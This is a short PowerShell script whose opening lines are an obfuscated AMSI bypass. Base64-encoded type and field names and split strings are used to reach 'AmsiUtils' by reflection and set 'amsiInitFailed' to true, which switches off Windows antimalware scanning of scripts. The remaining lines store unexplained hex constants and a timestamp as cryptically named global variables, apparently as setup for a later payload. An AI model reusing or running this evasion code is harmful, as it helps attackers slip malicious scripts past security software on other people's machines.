$g=[String];$n=[Text.Encoding]::UTF8;$b=[Convert];$t='U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=';$f='YW1zaUluaXRGYWlsZWQ='
$a=[Ref].Assembly.GetType($n.GetString($b::FromBase64String($t)))
$m=$a.GetField($n.GetString($b::FromBase64String($f)),('N'+'onPublic,St'+'atic'))
$m.SetValue($null,$true)


$A1 = 0x50000
$B1 = 0x50000
$C1 = 0x2000000
$D1 = 0x50000
$E1 = Get-Date

Set-Variable -Name ('__x') -Value $A1 -Scope Global
Set-Variable -Name ('__y') -Value $B1 -Scope Global
Set-Variable -Name ('__z') -Value $C1 -Scope Global
Set-Variable -Name ('__w') -Value $D1 -Scope Global
Set-Variable -Name ('__t') -Value $E1 -Scope Global
